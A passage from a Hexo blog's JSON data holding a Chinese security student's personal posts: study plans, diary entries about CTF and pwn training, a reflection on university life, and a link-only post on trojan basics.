Learning网课</li>\n<li>线代</li>\n<li>XCTF</li>\n<li>PAT每日一练</li>\n<li>ACM</li>\n<li>TOFEL</li>\n</ol>\n<p>每日计划完成，感觉自己离梦想又近了一步，反则更远了一步。</p>\n","excerpt":"","more":"<p>昨天考完了PAT，能力不济是其一，没有拿到满分；另外CS的竞争是激烈的，我等非科班出身的应真切的看到自身的处境。不过也正是这样才有趣的吧。</p>\n<p>总结下这次PAT的收获吧：</p>\n<ol>\n<li>春季考试很可能放水</li>\n<li>永远不要有侥幸心理，因为复习的不考，考的不复习，所以好好准备</li>\n<li>人外有人，天外有天</li>\n<li>人若无名，便可专心练剑。物若无名，便可随意取舍。</li>\n</ol>\n<p>下面的任务吧：</p>\n<ol>\n<li>Machine Learning网课</li>\n<li>线代</li>\n<li>XCTF</li>\n<li>PAT每日一练</li>\n<li>ACM</li>\n<li>TOFEL</li>\n</ol>\n<p>每日计划完成，感觉自己离梦想又近了一步，反则更远了一步。</p>\n"},{"title":"大二学习与生活计划","date":"2017-02-08T17:44:08.000Z","_content":"\n>  [大二时，你在做什么](https://www.zhihu.com/question/19872727)\n\n## [这是我的回答呢](https://www.zhihu.com/question/19872727/answer/121924298?from=profile_answer_card)\n\n一年后，我再回来看时，希望可以让自己满意。\n\n0. 学好英语，600+分数过六级。\n1. 十万行代码。\n2. 独立从前端到后端开发一个平台。\n3. 在逆向与pwn上达到牛师傅的水平(不过可能直到毕业也达不到的)。\n4. 暑假能去向往的安全公司实习。\n5. 将团队带到一个新高度。培养几个能发展的新苗子。\n6. 社团进入正轨。\n7. 如果以上完成了大部分，那么最后一条估计是完不成了。。找到喜欢的妹子。。\n\n## 以下算是具体的实施计划吧：\n\n0. 每天200行代码，上传到github, 创建自己的代码仓库， 有自己的项目。\n1. 每天一道pwn或者re， 自己调试出来， 掌握的知识点务必写道博客里。\n2. 每天背单词， 看英语新闻一篇。\n3. 睡前关注安全新动态，好的文章转载， 以后转载到team的博客上。\n4. 尽快在土司上建立账号。\n5. 按时洗衣服， 尽早睡觉， 不要无故熬夜。\n6. 每周打一个电话回家。\n7. 用番茄土豆记录有效学习时间， 提高效率， 每周打印有效学习时间。\n\n## EeveryDay Life\n\n### 2016.9.21\n结束了两天的上海自由行，ISG拿了一个三等奖，虽然含金量不高，但是依旧是值得为之兴奋的。这只是一个开始，永远不要放弃。学校太令人失望了，但还好我们的团队内部活力满满。虽然队友还是太菜了，大多数人也不是那么努力，但自己也没有达到一定的高度呀。以后在Bin方向做出成绩后多向牛博士请教，参加高级的比赛。\n\n最近的代码看的不是很多，python以后就是我的开发主要语言了吧。找到了一些短小的开源项目，准备阅读。看了看CSDN上的外包项目，除了一些我跳一跳还是能够得着的之外，大都数都还是不能做的，coding能力还是大大要提高的。想换键盘。\n\n24号之前把合天的资料转成Markdown，实验做一下，顺便练一下爬虫。再整理一下常见C的汇编转换，整理一下，留给学弟看。\n\n***\n\n### 2016.9.23\n\n天天都要军训，真的好累。真的感觉意志力快消磨光了。找夏想想聊聊天，但婉拒了，言语中带着以前的温柔，还是谢谢你能这么耐心了。现在的我是不是太功利了。\n\n爸妈，我不知道怎么说了。很复杂。不想说。\n\n我真怕我会坚持不了。\n\n承担不起你的野心，也辜负了所受的苦难。\n\n***\n\n尴尬啊，最近得写色情图片爬虫了，其实我还是很想写的，就是不太想展示出来。\n\n写个色情图片爬虫为什么不能写个色情网站的大全呢，如果是写一个这种东西回不回更有价值？\n\n说说最近吧，python练习册做的还是不错的，我觉得是时候可以自己开始写东西了。发现了学语言的最好的方法，先学个大概的语法，然后就上手开始写程序，最后看看语法书，总结一下，学的又快又好。\n\n可是关于pwn和逆向的都还没怎么看，今天一定要把一个逆向给做完，就那个混淆迷宫吧。\n\n200行代码的量还是没有做到，今天应该可以做到的，毕竟要写一个大程序呢。\n","source":"_posts/大二学习与生活计划.md","raw":"---\ntitle: 大二学习与生活计划\ntags: [life]\ncategories: []\ndate: 2017-02-09 01:44:08\n---\n\n>  [大二时，你在做什么](https://www.zhihu.com/question/19872727)\n\n## [这是我的回答呢](https://www.zhihu.com/question/19872727/answer/121924298?from=profile_answer_card)\n\n一年后，我再回来看时，希望可以让自己满意。\n\n0. 学好英语，600+分数过六级。\n1. 十万行代码。\n2. 独立从前端到后端开发一个平台。\n3. 在逆向与pwn上达到牛师傅的水平(不过可能直到毕业也达不到的)。\n4. 暑假能去向往的安全公司实习。\n5. 将团队带到一个新高度。培养几个能发展的新苗子。\n6. 社团进入正轨。\n7. 如果以上完成了大部分，那么最后一条估计是完不成了。。找到喜欢的妹子。。\n\n## 以下算是具体的实施计划吧：\n\n0. 每天200行代码，上传到github, 创建自己的代码仓库， 有自己的项目。\n1. 每天一道pwn或者re， 自己调试出来， 掌握的知识点务必写道博客里。\n2. 每天背单词， 看英语新闻一篇。\n3. 睡前关注安全新动态，好的文章转载， 以后转载到team的博客上。\n4. 尽快在土司上建立账号。\n5. 按时洗衣服， 尽早睡觉， 不要无故熬夜。\n6. 每周打一个电话回家。\n7. 用番茄土豆记录有效学习时间， 提高效率， 每周打印有效学习时间。\n\n## EeveryDay Life\n\n### 2016.9.21\n结束了两天的上海自由行，ISG拿了一个三等奖，虽然含金量不高，但是依旧是值得为之兴奋的。这只是一个开始，永远不要放弃。学校太令人失望了，但还好我们的团队内部活力满满。虽然队友还是太菜了，大多数人也不是那么努力，但自己也没有达到一定的高度呀。以后在Bin方向做出成绩后多向牛博士请教，参加高级的比赛。\n\n最近的代码看的不是很多，python以后就是我的开发主要语言了吧。找到了一些短小的开源项目，准备阅读。看了看CSDN上的外包项目，除了一些我跳一跳还是能够得着的之外，大都数都还是不能做的，coding能力还是大大要提高的。想换键盘。\n\n24号之前把合天的资料转成Markdown，实验做一下，顺便练一下爬虫。再整理一下常见C的汇编转换，整理一下，留给学弟看。\n\n***\n\n### 2016.9.23\n\n天天都要军训，真的好累。真的感觉意志力快消磨光了。找夏想想聊聊天，但婉拒了，言语中带着以前的温柔，还是谢谢你能这么耐心了。现在的我是不是太功利了。\n\n爸妈，我不知道怎么说了。很复杂。不想说。\n\n我真怕我会坚持不了。\n\n承担不起你的野心，也辜负了所受的苦难。\n\n***\n\n尴尬啊，最近得写色情图片爬虫了，其实我还是很想写的，就是不太想展示出来。\n\n写个色情图片爬虫为什么不能写个色情网站的大全呢，如果是写一个这种东西回不回更有价值？\n\n说说最近吧，python练习册做的还是不错的，我觉得是时候可以自己开始写东西了。发现了学语言的最好的方法，先学个大概的语法，然后就上手开始写程序，最后看看语法书，总结一下，学的又快又好。\n\n可是关于pwn和逆向的都还没怎么看，今天一定要把一个逆向给做完，就那个混淆迷宫吧。\n\n200行代码的量还是没有做到，今天应该可以做到的，毕竟要写一个大程序呢。\n","slug":"大二学习与生活计划","published":1,"updated":"2017-02-08T17:48:32.852Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k47004vhv18o66379ap","content":"<blockquote>\n<p> <a href=\"https://www.zhihu.com/question/19872727\" target=\"_blank\" rel=\"external\">大二时，你在做什么</a></p>\n</blockquote>\n<h2 id=\"这是我的回答呢\"><a href=\"#这是我的回答呢\" class=\"headerlink\" title=\"这是我的回答呢\"></a><a href=\"https://www.zhihu.com/question/19872727/answer/121924298?from=profile_answer_card\" target=\"_blank\" rel=\"external\">这是我的回答呢</a></h2><p>一年后，我再回来看时，希望可以让自己满意。</p>\n<ol>\n<li>学好英语，600+分数过六级。</li>\n<li>十万行代码。</li>\n<li>独立从前端到后端开发一个平台。</li>\n<li>在逆向与pwn上达到牛师傅的水平(不过可能直到毕业也达不到的)。</li>\n<li>暑假能去向往的安全公司实习。</li>\n<li>将团队带到一个新高度。培养几个能发展的新苗子。</li>\n<li>社团进入正轨。</li>\n<li>如果以上完成了大部分，那么最后一条估计是完不成了。。找到喜欢的妹子。。</li>\n</ol>\n<h2 id=\"以下算是具体的实施计划吧：\"><a href=\"#以下算是具体的实施计划吧：\" class=\"headerlink\" title=\"以下算是具体的实施计划吧：\"></a>以下算是具体的实施计划吧：</h2><ol>\n<li>每天200行代码，上传到github, 创建自己的代码仓库， 有自己的项目。</li>\n<li>每天一道pwn或者re， 自己调试出来， 掌握的知识点务必写道博客里。</li>\n<li>每天背单词， 看英语新闻一篇。</li>\n<li>睡前关注安全新动态，好的文章转载， 以后转载到team的博客上。</li>\n<li>尽快在土司上建立账号。</li>\n<li>按时洗衣服， 尽早睡觉， 不要无故熬夜。</li>\n<li>每周打一个电话回家。</li>\n<li>用番茄土豆记录有效学习时间， 提高效率， 每周打印有效学习时间。</li>\n</ol>\n<h2 id=\"EeveryDay-Life\"><a href=\"#EeveryDay-Life\" class=\"headerlink\" title=\"EeveryDay Life\"></a>EeveryDay Life</h2><h3 id=\"2016-9-21\"><a href=\"#2016-9-21\" class=\"headerlink\" title=\"2016.9.21\"></a>2016.9.21</h3><p>结束了两天的上海自由行，ISG拿了一个三等奖，虽然含金量不高，但是依旧是值得为之兴奋的。这只是一个开始，永远不要放弃。学校太令人失望了，但还好我们的团队内部活力满满。虽然队友还是太菜了，大多数人也不是那么努力，但自己也没有达到一定的高度呀。以后在Bin方向做出成绩后多向牛博士请教，参加高级的比赛。</p>\n<p>最近的代码看的不是很多，python以后就是我的开发主要语言了吧。找到了一些短小的开源项目，准备阅读。看了看CSDN上的外包项目，除了一些我跳一跳还是能够得着的之外，大都数都还是不能做的，coding能力还是大大要提高的。想换键盘。</p>\n<p>24号之前把合天的资料转成Markdown，实验做一下，顺便练一下爬虫。再整理一下常见C的汇编转换，整理一下，留给学弟看。</p>\n<hr>\n<h3 id=\"2016-9-23\"><a href=\"#2016-9-23\" class=\"headerlink\" title=\"2016.9.23\"></a>2016.9.23</h3><p>天天都要军训，真的好累。真的感觉意志力快消磨光了。找夏想想聊聊天，但婉拒了，言语中带着以前的温柔，还是谢谢你能这么耐心了。现在的我是不是太功利了。</p>\n<p>爸妈，我不知道怎么说了。很复杂。不想说。</p>\n<p>我真怕我会坚持不了。</p>\n<p>承担不起你的野心，也辜负了所受的苦难。</p>\n<hr>\n<p>尴尬啊，最近得写色情图片爬虫了，其实我还是很想写的，就是不太想展示出来。</p>\n<p>写个色情图片爬虫为什么不能写个色情网站的大全呢，如果是写一个这种东西回不回更有价值？</p>\n<p>说说最近吧，python练习册做的还是不错的，我觉得是时候可以自己开始写东西了。发现了学语言的最好的方法，先学个大概的语法，然后就上手开始写程序，最后看看语法书，总结一下，学的又快又好。</p>\n<p>可是关于pwn和逆向的都还没怎么看，今天一定要把一个逆向给做完，就那个混淆迷宫吧。</p>\n<p>200行代码的量还是没有做到，今天应该可以做到的，毕竟要写一个大程序呢。</p>\n","excerpt":"","more":"<blockquote>\n<p> <a href=\"https://www.zhihu.com/question/19872727\">大二时，你在做什么</a></p>\n</blockquote>\n<h2 id=\"这是我的回答呢\"><a href=\"#这是我的回答呢\" class=\"headerlink\" title=\"这是我的回答呢\"></a><a href=\"https://www.zhihu.com/question/19872727/answer/121924298?from=profile_answer_card\">这是我的回答呢</a></h2><p>一年后，我再回来看时，希望可以让自己满意。</p>\n<ol>\n<li>学好英语，600+分数过六级。</li>\n<li>十万行代码。</li>\n<li>独立从前端到后端开发一个平台。</li>\n<li>在逆向与pwn上达到牛师傅的水平(不过可能直到毕业也达不到的)。</li>\n<li>暑假能去向往的安全公司实习。</li>\n<li>将团队带到一个新高度。培养几个能发展的新苗子。</li>\n<li>社团进入正轨。</li>\n<li>如果以上完成了大部分，那么最后一条估计是完不成了。。找到喜欢的妹子。。</li>\n</ol>\n<h2 id=\"以下算是具体的实施计划吧：\"><a href=\"#以下算是具体的实施计划吧：\" class=\"headerlink\" title=\"以下算是具体的实施计划吧：\"></a>以下算是具体的实施计划吧：</h2><ol>\n<li>每天200行代码，上传到github, 创建自己的代码仓库， 有自己的项目。</li>\n<li>每天一道pwn或者re， 自己调试出来， 掌握的知识点务必写道博客里。</li>\n<li>每天背单词， 看英语新闻一篇。</li>\n<li>睡前关注安全新动态，好的文章转载， 以后转载到team的博客上。</li>\n<li>尽快在土司上建立账号。</li>\n<li>按时洗衣服， 尽早睡觉， 不要无故熬夜。</li>\n<li>每周打一个电话回家。</li>\n<li>用番茄土豆记录有效学习时间， 提高效率， 每周打印有效学习时间。</li>\n</ol>\n<h2 id=\"EeveryDay-Life\"><a href=\"#EeveryDay-Life\" class=\"headerlink\" title=\"EeveryDay Life\"></a>EeveryDay Life</h2><h3 id=\"2016-9-21\"><a href=\"#2016-9-21\" class=\"headerlink\" title=\"2016.9.21\"></a>2016.9.21</h3><p>结束了两天的上海自由行，ISG拿了一个三等奖，虽然含金量不高，但是依旧是值得为之兴奋的。这只是一个开始，永远不要放弃。学校太令人失望了，但还好我们的团队内部活力满满。虽然队友还是太菜了，大多数人也不是那么努力，但自己也没有达到一定的高度呀。以后在Bin方向做出成绩后多向牛博士请教，参加高级的比赛。</p>\n<p>最近的代码看的不是很多，python以后就是我的开发主要语言了吧。找到了一些短小的开源项目，准备阅读。看了看CSDN上的外包项目，除了一些我跳一跳还是能够得着的之外，大都数都还是不能做的，coding能力还是大大要提高的。想换键盘。</p>\n<p>24号之前把合天的资料转成Markdown，实验做一下，顺便练一下爬虫。再整理一下常见C的汇编转换，整理一下，留给学弟看。</p>\n<hr>\n<h3 id=\"2016-9-23\"><a href=\"#2016-9-23\" class=\"headerlink\" title=\"2016.9.23\"></a>2016.9.23</h3><p>天天都要军训，真的好累。真的感觉意志力快消磨光了。找夏想想聊聊天，但婉拒了，言语中带着以前的温柔，还是谢谢你能这么耐心了。现在的我是不是太功利了。</p>\n<p>爸妈，我不知道怎么说了。很复杂。不想说。</p>\n<p>我真怕我会坚持不了。</p>\n<p>承担不起你的野心，也辜负了所受的苦难。</p>\n<hr>\n<p>尴尬啊，最近得写色情图片爬虫了，其实我还是很想写的，就是不太想展示出来。</p>\n<p>写个色情图片爬虫为什么不能写个色情网站的大全呢，如果是写一个这种东西回不回更有价值？</p>\n<p>说说最近吧，python练习册做的还是不错的，我觉得是时候可以自己开始写东西了。发现了学语言的最好的方法，先学个大概的语法，然后就上手开始写程序，最后看看语法书，总结一下，学的又快又好。</p>\n<p>可是关于pwn和逆向的都还没怎么看，今天一定要把一个逆向给做完，就那个混淆迷宫吧。</p>\n<p>200行代码的量还是没有做到，今天应该可以做到的，毕竟要写一个大程序呢。</p>\n"},{"title":"当我即将离去","date":"2017-11-02T11:55:31.000Z","_content":"\n## 0x00\n\n同班的一位女孩在准备德国的申请，不日将离开这里，去异国求学了。知她为了自己的学术梦而破釜沉舟，心底里为她祝福。\n大三开学已有数月，然实际上任旧浑浑噩噩，东忙西凑的，总不禁问自己“时间都去哪儿了”。其实我也深知自己的惶恐，背负了一定要离开这里的愿望，在这里一言一行都是煎熬；但事实上总是事与愿违，很多的时候痛恨自己无能，看数学时找不回当年势如破竹的感觉了，而英语有一直没有起色，不知明年此时此刻我是否能够向今天这样，依然信心满满，依然自视清高。\n\n## 0x01\n\n自恃清高，然也？非也。麻烦事情一件接着一件，不知是不是体制内的必然性，明明很纯粹的东西，在这里就变得面目全非。我希望能够成就一个技术之上、自由至上的团队——也是我一直向往的东西，但是现在看来，好高骛远了。真正爱技术的人寥寥无几，真正追求好奇，探索未知的人更是少之更少，虽然我也不是什么geek，但是这样的人时没法组成国家一流的队伍的。大多数人对目前的成绩沾沾自喜，大环境如此，小组织也无异。更加可怖的是死板的评价体制、雾霾般的官僚风气，掣肘无处不在。果然啊，体制内是体制内的玩法，“右”似乎是这里的天然属性，不求无功，但求无过，虽然我也是反对用破坏来换取建设的，但是我害怕的是处处似乎带着手链，久了，也就不自知了。\n\n## 0x02\n\n“我来这里久了，也就成为了别人口中的那里。”","source":"_posts/当我即将离去.md","raw":"---\ntitle: 当我即将离去\ntags:\n  - life\ncategories: []\ndate: 2017-11-02 19:55:31\n---\n\n## 0x00\n\n同班的一位女孩在准备德国的申请，不日将离开这里，去异国求学了。知她为了自己的学术梦而破釜沉舟，心底里为她祝福。\n大三开学已有数月，然实际上任旧浑浑噩噩，东忙西凑的，总不禁问自己“时间都去哪儿了”。其实我也深知自己的惶恐，背负了一定要离开这里的愿望，在这里一言一行都是煎熬；但事实上总是事与愿违，很多的时候痛恨自己无能，看数学时找不回当年势如破竹的感觉了，而英语有一直没有起色，不知明年此时此刻我是否能够向今天这样，依然信心满满，依然自视清高。\n\n## 0x01\n\n自恃清高，然也？非也。麻烦事情一件接着一件，不知是不是体制内的必然性，明明很纯粹的东西，在这里就变得面目全非。我希望能够成就一个技术之上、自由至上的团队——也是我一直向往的东西，但是现在看来，好高骛远了。真正爱技术的人寥寥无几，真正追求好奇，探索未知的人更是少之更少，虽然我也不是什么geek，但是这样的人时没法组成国家一流的队伍的。大多数人对目前的成绩沾沾自喜，大环境如此，小组织也无异。更加可怖的是死板的评价体制、雾霾般的官僚风气，掣肘无处不在。果然啊，体制内是体制内的玩法，“右”似乎是这里的天然属性，不求无功，但求无过，虽然我也是反对用破坏来换取建设的，但是我害怕的是处处似乎带着手链，久了，也就不自知了。\n\n## 0x02\n\n“我来这里久了，也就成为了别人口中的那里。”","slug":"当我即将离去","published":1,"updated":"2017-11-02T12:18:51.856Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k48004xhv18hq20im08","content":"<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>同班的一位女孩在准备德国的申请，不日将离开这里，去异国求学了。知她为了自己的学术梦而破釜沉舟，心底里为她祝福。<br>大三开学已有数月，然实际上任旧浑浑噩噩，东忙西凑的，总不禁问自己“时间都去哪儿了”。其实我也深知自己的惶恐，背负了一定要离开这里的愿望，在这里一言一行都是煎熬；但事实上总是事与愿违，很多的时候痛恨自己无能，看数学时找不回当年势如破竹的感觉了，而英语有一直没有起色，不知明年此时此刻我是否能够向今天这样，依然信心满满，依然自视清高。</p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p>自恃清高，然也？非也。麻烦事情一件接着一件，不知是不是体制内的必然性，明明很纯粹的东西，在这里就变得面目全非。我希望能够成就一个技术之上、自由至上的团队——也是我一直向往的东西，但是现在看来，好高骛远了。真正爱技术的人寥寥无几，真正追求好奇，探索未知的人更是少之更少，虽然我也不是什么geek，但是这样的人时没法组成国家一流的队伍的。大多数人对目前的成绩沾沾自喜，大环境如此，小组织也无异。更加可怖的是死板的评价体制、雾霾般的官僚风气，掣肘无处不在。果然啊，体制内是体制内的玩法，“右”似乎是这里的天然属性，不求无功，但求无过，虽然我也是反对用破坏来换取建设的，但是我害怕的是处处似乎带着手链，久了，也就不自知了。</p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>“我来这里久了，也就成为了别人口中的那里。”</p>\n","excerpt":"","more":"<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>同班的一位女孩在准备德国的申请，不日将离开这里，去异国求学了。知她为了自己的学术梦而破釜沉舟，心底里为她祝福。<br>大三开学已有数月，然实际上任旧浑浑噩噩，东忙西凑的，总不禁问自己“时间都去哪儿了”。其实我也深知自己的惶恐，背负了一定要离开这里的愿望，在这里一言一行都是煎熬；但事实上总是事与愿违，很多的时候痛恨自己无能，看数学时找不回当年势如破竹的感觉了，而英语有一直没有起色，不知明年此时此刻我是否能够向今天这样，依然信心满满，依然自视清高。</p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p>自恃清高，然也？非也。麻烦事情一件接着一件，不知是不是体制内的必然性，明明很纯粹的东西，在这里就变得面目全非。我希望能够成就一个技术之上、自由至上的团队——也是我一直向往的东西，但是现在看来，好高骛远了。真正爱技术的人寥寥无几，真正追求好奇，探索未知的人更是少之更少，虽然我也不是什么geek，但是这样的人时没法组成国家一流的队伍的。大多数人对目前的成绩沾沾自喜，大环境如此，小组织也无异。更加可怖的是死板的评价体制、雾霾般的官僚风气，掣肘无处不在。果然啊，体制内是体制内的玩法，“右”似乎是这里的天然属性，不求无功，但求无过，虽然我也是反对用破坏来换取建设的，但是我害怕的是处处似乎带着手链，久了，也就不自知了。</p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>“我来这里久了，也就成为了别人口中的那里。”</p>\n"},{"title":"木马基础知识","date":"2017-07-28T01:39:36.000Z","_content":"\n## 攻击手段\n\n1. 木马概念\n\n## 防御手段\n\n1. 主动防御\n\n## 看雪优秀入门文章搜集\n\n[从0分析一款经典的感染型远控木马](http://bbs.pediy.com/thread-217755.htm)\n[一个lpk.dll病毒的分析报告](http://bbs.pediy.com/thread-217841.htm)\n[lpk.dll内木马本体的初步分析——进阶篇](http://bbs.pediy.com/thread-187620.htm)\n\n## 参考资料\n\n[木马基础知识要点](http://www.cnblogs.com/d0main/p/6666644.html)","source":"_posts/木马基础知识.md","raw":"---\ntitle: 木马基础知识\ntags: []\ncategories: []\ndate: 2017-07-28 09:39:36\n---\n\n## 攻击手段\n\n1. 木马概念\n\n## 防御手段\n\n1. 主动防御\n\n## 看雪优秀入门文章搜集\n\n[从0分析一款经典的感染型远控木马](http://bbs.pediy.com/thread-217755.htm)\n[一个lpk.dll病毒的分析报告](http://bbs.pediy.com/thread-217841.htm)\n[lpk.dll内木马本体的初步分析——进阶篇](http://bbs.pediy.com/thread-187620.htm)\n\n## 参考资料\n\n[木马基础知识要点](http://www.cnblogs.com/d0main/p/6666644.html)","slug":"木马基础知识","published":1,"updated":"2017-07-28T03:08:16.572Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k490050hv1810sbs57n","content":"<h2 id=\"攻击手段\"><a href=\"#攻击手段\" class=\"headerlink\" title=\"攻击手段\"></a>攻击手段</h2><ol>\n<li>木马概念</li>\n</ol>\n<h2 id=\"防御手段\"><a href=\"#防御手段\" class=\"headerlink\" title=\"防御手段\"></a>防御手段</h2><ol>\n<li>主动防御</li>\n</ol>\n<h2 id=\"看雪优秀入门文章搜集\"><a href=\"#看雪优秀入门文章搜集\" class=\"headerlink\" title=\"看雪优秀入门文章搜集\"></a>看雪优秀入门文章搜集</h2><p><a href=\"http://bbs.pediy.com/thread-217755.htm\" target=\"_blank\" rel=\"external\">从0分析一款经典的感染型远控木马</a><br><a href=\"http://bbs.pediy.com/thread-217841.htm\" target=\"_blank\" rel=\"external\">一个lpk.dll病毒的分析报告</a><br><a href=\"http://bbs.pediy.com/thread-187620.htm\" target=\"_blank\" rel=\"external\">lpk.dll内木马本体的初步分析——进阶篇</a></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"http://www.cnblogs.com/d0main/p/6666644.html\" target=\"_blank\" rel=\"external\">木马基础知识要点</a></p>\n","excerpt":"","more":"<h2 id=\"攻击手段\"><a href=\"#攻击手段\" class=\"headerlink\" title=\"攻击手段\"></a>攻击手段</h2><ol>\n<li>木马概念</li>\n</ol>\n<h2 id=\"防御手段\"><a href=\"#防御手段\" class=\"headerlink\" title=\"防御手段\"></a>防御手段</h2><ol>\n<li>主动防御</li>\n</ol>\n<h2 id=\"看雪优秀入门文章搜集\"><a href=\"#看雪优秀入门文章搜集\" class=\"headerlink\" title=\"看雪优秀入门文章搜集\"></a>看雪优秀入门文章搜集</h2><p><a href=\"http://bbs.pediy.com/thread-217755.htm\">从0分析一款经典的感染型远控木马</a><br><a href=\"http://bbs.pediy.com/thread-217841.htm\">一个lpk.dll病毒的分析报告</a><br><a href=\"http://bbs.pediy.com/thread-187620.htm\">lpk.dll内木马本体的初步分析——进阶篇</a></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"http://www.cnblogs.com/d0main/p/6666644.html\">木马基础知识要点</a></p>\n"},{"title":"瓜皮的日常吐槽","date":"2017-04-13T02:13:06.000Z","_content":"\n诶诶诶，我说。我的运维怎么这么烂啊，自己的博客和服务器用用也不知道是哪里的内存泄漏了，开机35%，跑个几星期就70%。。。随便一看还能发现一堆zombia process，杀都杀不死，必须得重启。。。hexo的启动慢的要死，要等个好几秒。。\n\n还有那个老博客，我都不敢看，惨不忍睹，就跑了个wordpress啊。\n\n奥还跑了个shadowsocks的server。。\n\n啥时候把那个博客关了，换个专门的shadowsocks，还能租出去，省得每个月吃我口粮钱v(｡･ω･｡)","source":"_posts/瓜皮的日常吐槽.md","raw":"---\ntitle: 瓜皮的日常吐槽\ntags:\n  - life\ncategories: []\ndate: 2017-04-13 10:13:06\n---\n\n诶诶诶，我说。我的运维怎么这么烂啊，自己的博客和服务器用用也不知道是哪里的内存泄漏了，开机35%，跑个几星期就70%。。。随便一看还能发现一堆zombia process，杀都杀不死，必须得重启。。。hexo的启动慢的要死，要等个好几秒。。\n\n还有那个老博客，我都不敢看，惨不忍睹，就跑了个wordpress啊。\n\n奥还跑了个shadowsocks的server。。\n\n啥时候把那个博客关了，换个专门的shadowsocks，还能租出去，省得每个月吃我口粮钱v(｡･ω･｡)","slug":"瓜皮的日常吐槽","published":1,"updated":"2017-04-13T02:21:48.309Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k4a0052hv18npmvvktc","content":"<p>诶诶诶，我说。我的运维怎么这么烂啊，自己的博客和服务器用用也不知道是哪里的内存泄漏了，开机35%，跑个几星期就70%。。。随便一看还能发现一堆zombia process，杀都杀不死，必须得重启。。。hexo的启动慢的要死，要等个好几秒。。</p>\n<p>还有那个老博客，我都不敢看，惨不忍睹，就跑了个wordpress啊。</p>\n<p>奥还跑了个shadowsocks的server。。</p>\n<p>啥时候把那个博客关了，换个专门的shadowsocks，还能租出去，省得每个月吃我口粮钱v(｡･ω･｡)</p>\n","excerpt":"","more":"<p>诶诶诶，我说。我的运维怎么这么烂啊，自己的博客和服务器用用也不知道是哪里的内存泄漏了，开机35%，跑个几星期就70%。。。随便一看还能发现一堆zombia process，杀都杀不死，必须得重启。。。hexo的启动慢的要死，要等个好几秒。。</p>\n<p>还有那个老博客，我都不敢看，惨不忍睹，就跑了个wordpress啊。</p>\n<p>奥还跑了个shadowsocks的server。。</p>\n<p>啥时候把那个博客关了，换个专门的shadowsocks，还能租出去，省得每个月吃我口粮钱v(｡･ω･｡)</p>\n"},{"title":"看雪2017CTF第九题","date":"2017-07-04T10:03:49.000Z","_content":"\n[系统调用号](https://filippo.io/linux-syscall-table/)","source":"_posts/看雪2017CTF第九题.md","raw":"---\ntitle: 看雪2017CTF第九题\ntags:\n  - 2017PediyCTF\n  - PWN\ncategories: []\ndate: 2017-07-04 18:03:49\n---\n\n[系统调用号](https://filippo.io/linux-syscall-table/)","slug":"看雪2017CTF第九题","published":1,"updated":"2017-07-04T17:30:46.968Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k4c0055hv18so7ivk5f","content":"<p><a href=\"https://filippo.io/linux-syscall-table/\" target=\"_blank\" rel=\"external\">系统调用号</a></p>\n","excerpt":"","more":"<p><a href=\"https://filippo.io/linux-syscall-table/\">系统调用号</a></p>\n"},{"title":"真是蛋疼的生活","date":"2017-04-18T23:54:32.000Z","_content":"\n## 0x00\n\n前两天南京线下赛结束，我校成绩惨淡。\n\n讲道理，不是我责怪队友，而是我真的没办法看着在我日夜奋战时看到他们在划水。平时训练中我对团队一直是放羊式的管理，始终认为激情与活力才是一个团队成功的最终要要素，而硬性的规定只不过是自欺欺人。\n\n但实事总是和我们想象的差太远了。\n\n我不明白还有什么方法能够挽救我们学校，挽救这个团队。一群没有能力，没有天赋，没有资源，没有创造力与激情的人组成的团队能走多远。我真的很羡慕那些有着可以并肩作战的队友的人，在你困难的时候可以给你鼓励，有勇气知难而上。我们可以一起研究一个问题到深夜，可以一起怼一道题目到把Google前十页的方法都试一遍，一个有技术氛围的团队，能够分享的团队，是1+1>2的。\n\n志不同，道不合。\n\n## 0x01\n\n即使对队友有千万的不满，也没办法掩盖自己不够努力的实事。\n\n蓝莲花的队伍一年时间就拿到了DEFCON入围资格，打出了全球19名的成绩。40个月60场拼尽全力的比赛。一场比赛至少一天是通宵的。我原本以为自己已经够努力了，但，无论是和大佬们，还是和他校选手比较，真的还差太多。\n\n大二了，当初给自己定的目标也完成了大概。但依旧一无所成。\n\n## 0x03\n\n没办法，资源太少了，未来还是会读研的吧。也不再为高考找借口了，只是4年差距太难弥补了，尽力吧。\n\n## 0x04\n\n总的来说，第一次参加线下赛，玩的还是蛮开心的，但是一直被打并不觉得很爽= =。。。\n\n真是蛋疼的生活啊。。。","source":"_posts/真是蛋疼的生活.md","raw":"---\ntitle: 真是蛋疼的生活\ntags:\n  - life\ncategories: []\ndate: 2017-04-19 07:54:32\n---\n\n## 0x00\n\n前两天南京线下赛结束，我校成绩惨淡。\n\n讲道理，不是我责怪队友，而是我真的没办法看着在我日夜奋战时看到他们在划水。平时训练中我对团队一直是放羊式的管理，始终认为激情与活力才是一个团队成功的最终要要素，而硬性的规定只不过是自欺欺人。\n\n但实事总是和我们想象的差太远了。\n\n我不明白还有什么方法能够挽救我们学校，挽救这个团队。一群没有能力，没有天赋，没有资源，没有创造力与激情的人组成的团队能走多远。我真的很羡慕那些有着可以并肩作战的队友的人，在你困难的时候可以给你鼓励，有勇气知难而上。我们可以一起研究一个问题到深夜，可以一起怼一道题目到把Google前十页的方法都试一遍，一个有技术氛围的团队，能够分享的团队，是1+1>2的。\n\n志不同，道不合。\n\n## 